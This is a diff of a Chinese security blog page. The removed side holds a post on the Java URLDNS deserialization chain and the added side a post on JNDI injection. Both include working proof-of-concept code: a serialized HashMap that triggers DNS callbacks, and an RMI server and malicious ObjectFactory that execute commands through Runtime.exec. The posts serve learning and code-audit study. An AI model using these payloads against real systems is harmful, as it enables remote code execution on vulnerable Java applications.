@@ -6,37 +6,36 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://teaboj.github.io">
-  <title>URLDNS链分析 | TeaBo’s 树洞</title>
+  <title>JNDI注入 | TeaBo’s 树洞</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="article">
-<meta property="og:title" content="URLDNS链分析">
-<meta property="og:url" content="https://teaboj.github.io/2021/07/27/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="TeaBo’s 树洞">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4D2K1.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4DKDP.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4DhVK.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4r1qx.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4rGdK.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4rcFS.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4rjyR.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4fowj.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4sfhD.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4W1UI.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W46bY8.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W46VdP.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4cHBR.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4gSjH.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4gKDs.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4gqMQ.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W42lsH.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W4fowj.png">
-<meta property="article:published_time" content="2021-07-27T05:55:34.000Z">
-<meta property="article:modified_time" content="2021-07-28T00:56:50.340Z">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192227531.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192239628.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192306646.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192413026.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192424433.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192444393.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192457447.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192515475.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192530456.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192557100.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192615981.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192630673.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192644053.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192654613.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192707781.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192725487.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192732877.png">
+<meta property="article:published_time" content="2021-08-10T07:19:29.000Z">
+<meta property="article:modified_time" content="2021-08-10T11:42:39.618Z">
 <meta property="article:author" content="TeaBo">
 <meta property="article:tag" content="java代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://z3.ax1x.com/2021/07/27/W4D2K1.png">
+<meta name="twitter:image" content="https://teaboj.github.io/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192227531.png">
   
     <link rel="alternative" href="/atom.xml" title="TeaBo’s 树洞" type="application/atom+xml">
   
@@ -187,20 +186,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-URLDNS链分析" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-JNDI注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      URLDNS链分析
+      JNDI注入
     </h1>
   
 
         
-        <a href="/2021/07/27/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-07-27T05:55:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-27</time>
+        <a href="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-08-10T07:19:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
 </a>
 
 
@@ -214,54 +213,73 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a><a id="more"></a>准备</h2><p>URLDNS链是反序列化中比较简单的一个链，它不受第三方依赖和版本的限制，所以通常用来判断是否存在反序列化。</p>
-<p>ysoserialize项目地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
-<p>先用ysoserial测试是否可用</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4D2K1.png" alt="W4D2K1.png"></p>
-<p>然后readObject()触发</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4DKDP.png" alt="W4DKDP.png"></p>
-<p>成功在DNSlog接收到请求</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4DhVK.png" alt="W4DhVK.png"></p>
-<h2 id="分析URLDNS链"><a href="#分析URLDNS链" class="headerlink" title="分析URLDNS链"></a>分析URLDNS链</h2><p>首先漏洞触发点是在<code>HashMap</code>的<code>readObject()</code></p>
-<p>对传入序列化数据流进行反序列化</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4r1qx.png" alt="W4r1qx.png"></p>
-<p><a href="https://imgtu.com/i/W4rGdK" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4rGdK.png" alt="W4rGdK.png"></a></p>
-<p>可以看到在<code>putVal()</code>中对<code>key</code>进行了<code>Hash()</code>处理</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4rcFS.png" alt="W4rcFS.png"></p>
-<p>再进入到<code>URL.hashCode()</code></p>
-<p><a href="https://imgtu.com/i/W4rjyR" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4rjyR.png" alt="W4rjyR.png"></a></p>
-<p><code>handler</code>属性默认是<code>URLStreamHandler</code>类</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4fowj.png" alt="W4fowj.png"></p>
-<p>在<code>URLStreamHandler.hashCode()</code>中直接调用<code>getHostAddress()</code>，<code>getByName()</code>会对url参数进行解析操作，从而发起一次dnslog请求。</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4sfhD.png" alt="W4sfhD.png"></p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4W1UI.png" alt="W4W1UI.png"></p>
-<p>利用链到此为止</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap -&gt; readObject()</span><br><span class="line">HashMap -&gt; putval()</span><br><span class="line">HashMap -&gt; hash()</span><br><span class="line">URL -&gt; hashCode()</span><br><span class="line">URLStreamHandler -&gt; hashCode()</span><br><span class="line">URLStreamHandler -&gt; getHostAddress()</span><br></pre></td></tr></table></figure>
-
-<p>但是注意到在生成payload时候对<code>HashMap</code>进行了<code>Put</code>操作，而put函数里也有putVal处理</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W46bY8.png" alt="W46bY8.png"></p>
-<p>所以在生成payload时候也发送了dnslog请求，我们得规避这种情况。</p>
-<p>在上面可以看到<code>URL.hashCode()</code>中有个判断，如果<code>hashCode</code>不等于-1那就直接return</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W46VdP.png" alt="W46VdP.png"></p>
-<p>所以可以利用反射来在put之前修改它的值，再之后又修改回-1</p>
-<p>poc:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//生成payload</span></span><br><span class="line">        HashMap map=<span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url=<span class="keyword">new</span> URL(<span class="string">"http://jrelef.dnslog.cn"</span>);</span><br><span class="line">        <span class="comment">//反射修改hashCode</span></span><br><span class="line">        Class cls=Class.forName(<span class="string">"java.net.URL"</span>);</span><br><span class="line">        Field hashCode=cls.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">123</span>); <span class="comment">//设置非 -1</span></span><br><span class="line">        map.put(url,<span class="string">"Teabo123"</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);  <span class="comment">//设置 -1</span></span><br><span class="line">        <span class="comment">//生成序列化文件</span></span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> FileOutputStream(<span class="string">"./Teabo1.bin"</span>);</span><br><span class="line">        ObjectOutputStream out1=<span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        out1.writeObject(map); <span class="comment">//map对象序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*触发反序列化</span></span><br><span class="line"><span class="comment">        ObjectInputStream In=new ObjectInputStream(new FileInputStream("./Teabo.bin"));</span></span><br><span class="line"><span class="comment">        In.readObject();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h2 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a><a id="more"></a>JNDI概念</h2><p>JNDI(<em>Java Naming and Directory Interface</em>),即Java命名和目录空间。它提供统一的客户端API,为开发人员提供了查找和访问各种命名和目录服务的统一接口，Java程序可以和这些命名与目录服务之间进行交互，可以通过JNDI访问远程的url来获取对应的服务。</p>
+<p><strong>JNDI和RMI</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. RMI只是一种远程对象访问的接口规范，遵循此规范的对象可被远程访问，但是要使用rmi的服务注册程序注册之后才能够被远程调用。</span><br><span class="line"></span><br><span class="line">2.  JNDI是Java命名和目录服务访问接口，通过JNDI，可以访问已经在命名和目录服务器中注册的服务对象,而RMI在调用这些服务之前，需要首先找到远程主机上提供服务的对象，这就是利用JNDI来完成的。RMI通过JNDI找到远程主机上提供服务的对象。</span><br><span class="line"></span><br><span class="line">3. jndi就像是url,记录着你要访问的地址，而rmi就像是http或是tcp,是一种连接方式，可以通过jndi找到&quot;地址&quot;,然后通过rmi这种连接方式去访问 。</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="Ysoserial中的URLDNS"><a href="#Ysoserial中的URLDNS" class="headerlink" title="Ysoserial中的URLDNS"></a>Ysoserial中的URLDNS</h2><p>首先在pom.xml找到入口类</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4cHBR.png" alt="W4cHBR.png"></p>
-<p>在解释器中添加运行时参数</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4gSjH.png" alt="W4gSjH.png"></p>
-<p>这样即可在项目中运行调试Poc</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4gKDs.png" alt="W4gKDs.png"></p>
-<p>在URLDNS链部分与上面分析的没出入，但是注意到<code>ysoserialize.URLDNS</code>并没有通过反射来防止在生成payload时触发<code>getHostAdress()</code></p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4gqMQ.png" alt="W4gqMQ.png"></p>
-<p>而是在<code>SilentURLStreamHandler()</code>这个类中重写了<code>getHostAddress()</code>,这样在put过程中遇到<code>getHostAddress()</code>就直接返回Null了，不会发送请求。</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W42lsH.png" alt="W42lsH.png"></p>
-<p>那为什么在<code>readObject</code>时又能进入到正确的<code>getHostAddress()</code>呢</p>
-<p>是<code>URL.handler</code>是<code>transient</code>声明的，无法被序列化，所以在反序列化时依然能向dnslog发送请求</p>
-<p><img src="https://z3.ax1x.com/2021/07/27/W4fowj.png" alt="W4fowj.png"></p>
+<p><strong>JNDI注入的场景</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.rmi、通过jndi reference远程调用object方法</span><br><span class="line">2.LDAP 通过序列化对象 JNDI Referene ldap地址</span><br><span class="line">3.CORBA IOR 远程获取实现类 (通过iiop协议)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p><em>需要注意的是</em></p>
+<p><em>在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference的工厂类(Factory Class)。如果需</em></p>
+<p><em>要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</em></p>
+<p>这里举的例子是<code>RMI+JNDI Reference</code></p>
+<h3 id="Server端（攻击者）"><a href="#Server端（攻击者）" class="headerlink" title="Server端（攻击者）"></a>Server端（攻击者）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");</span></span><br><span class="line"></span><br><span class="line">        Registry re= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置外部对象引用,绑定恶意对象名与对象远程引用地址</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">"evil"</span>,<span class="string">"evil"</span>,<span class="string">"http://127.0.0.1:5599/"</span>);</span><br><span class="line">        ReferenceWrapper reWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//rmi绑定Reference对象</span></span><br><span class="line">        re.bind(<span class="string">"t1"</span>,reWrapper);</span><br><span class="line">        System.out.println(<span class="string">"Running rmi://127.0.0.1/t1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>Reference</code>可以将访问对象放置在外部远程服务器上，此时攻击者只需要提供恶意的对象供客户端调用即可执行恶意类。</p>
+<h3 id="Client端（被攻击目标）"><a href="#Client端（被攻击目标）" class="headerlink" title="Client端（被攻击目标）"></a>Client端（被攻击目标）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//攻击者控制URL为恶意RMI服务地址</span></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/t1"</span>;</span><br><span class="line">        <span class="comment">//初始化Context</span></span><br><span class="line">        InitialContext context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">//通过调用lookup函数来访问rmi的注册表，尝试调用远程对象</span></span><br><span class="line">		context.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果这里<code>lookup()</code>的URL可控，那么攻击者就能指定URL为恶意服务目标，从而访问加载远程恶意对象。</p>
+<h3 id="恶意Factory对象"><a href="#恶意Factory对象" class="headerlink" title="恶意Factory对象"></a>恶意Factory对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hack"</span>);</span><br><span class="line">        <span class="comment">//命令执行</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"curl 127.0.0.1:5599"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之所以选择<code>getObjectInstance</code>并重写恶意代码执行的原因见下文。</p>
+<p>将它放在Server端的Reference绑定的外部地址，作为恶意构造的<code>factory</code>类。</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192227531.png" alt="image-20210810192227531"></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192239628.png" alt="image-20210810192239628"></p>
+<h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><p>先后启动server和client</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192306646.png" alt="image-20210810192306646"></p>
+<p>当客户端调用<code>lookup</code>获取远程类时，就会获取到<code>Reference</code>对象，在绑定的地址上寻找指定的<code>Factory</code>类，最终实例化并执行重写的方法。</p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>从客户端的lookup开始</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192413026.png" alt="image-20210810192413026"></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192424433.png" alt="image-20210810192424433"></p>
+<p><code>getURLOrDefaultInitCtx</code>根据协议头来返回一个对应的Context对象，所以这里返回一个rmi的Context</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192444393.png" alt="image-20210810192444393"></p>
+<p>接着再次进入<code>lookup</code>方法</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192457447.png" alt="image-20210810192457447"></p>
+<p>首先进行了<code>getRootURLContext</code>方法，该方法对rmi地址进行解析，返回解析好的注册对象（包含地址、端口等信息）</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192515475.png" alt="image-20210810192515475"></p>
+<p>对<code>RegistryContext</code>进行<code>lookup</code>调用</p>
+<p><code>RegistryContext#lookup</code></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192530456.png" alt="image-20210810192530456"></p>
+<p>针对刚才解析好的注册对象，再次进行lookup，作用是寻找刚才解析结果里的地址，也就是绑定在RMI上的地址，这里是t1</p>
+<p>进入到<code>RegistryImpl_Stub#lookup</code></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192557100.png" alt="image-20210810192557100"></p>
+<p>该步最终返回的是<code>ReferenceWrapper_Stub</code>对象</p>
+<p>接着返回RegistryContext#lookup，调用到<code>decodeObject()</code>方法</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192615981.png" alt="image-20210810192615981"></p>
+<p>这个DecodeObject会对传入对象判断是否是RemoteReference类</p>
+<p>（<em>这就是在Server端我们为什么不直接用Reference,而是再套一层ReferenceWrapper的原因，只有这样才有继承Remote的条件</em>）</p>
+<p>然后再调用<code>NamingManager.getObjectInstance()</code></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192630673.png" alt="image-20210810192630673"></p>
+<p><code>NamingManager#getObjectInstance()</code></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192644053.png" alt="image-20210810192644053"></p>
+<p>进入<code>getObjectFactoryFromReference()</code></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192654613.png" alt="image-20210810192654613"></p>
+<p>该函数对我们指定的codebase地址上的class进行加载，并且实例化并返回</p>
+<p>接着对这个实例化的恶意对象进行<code>getObjectInstance()</code></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192707781.png" alt="image-20210810192707781"></p>
+<p>而这个<code>getObjectInstance()</code>正是我们在构造的恶意中重写的方法，因此调用后就会执行我们构造的命令。</p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192725487.png" alt="image-20210810192725487"></p>
+<p><img src="/2021/08/10/JNDI%E6%B3%A8%E5%85%A5/image-20210810192732877.png" alt="image-20210810192732877"></p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>RMI只是作为JNDI注入的一种利用途径，还有其他的服务利用方法，例如LDAP等。并且针对JNDI还有各种各样的限制绕过手法需要学习，例如利用受害者本地classpath作为factory工厂等。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/nice0e3/p/13958047.html" target="_blank" rel="noopener">https://www.cnblogs.com/nice0e3/p/13958047.html</a></p>
+<p><a href="https://www.cnblogs.com/tr1ple/p/11558842.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11558842.html</a></p>
+<p><a href="https://www.cnblogs.com/zpchcbd/p/14941783.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/14941783.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_39783633/article/details/111615464" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39783633/article/details/111615464</a></p>
 
       
 
@@ -307,18 +325,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/07/27/Commons-Collections-1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Commons Collections 1
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">蓝帽杯 One P_interr_PHP</div>
+    <a href="/2021/08/07/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RMI反序列化</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -345,7 +354,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#准备"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析URLDNS链"><span class="toc-number">2.</span> <span class="toc-text">分析URLDNS链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ysoserial中的URLDNS"><span class="toc-number">3.</span> <span class="toc-text">Ysoserial中的URLDNS</span></a></li></ol>
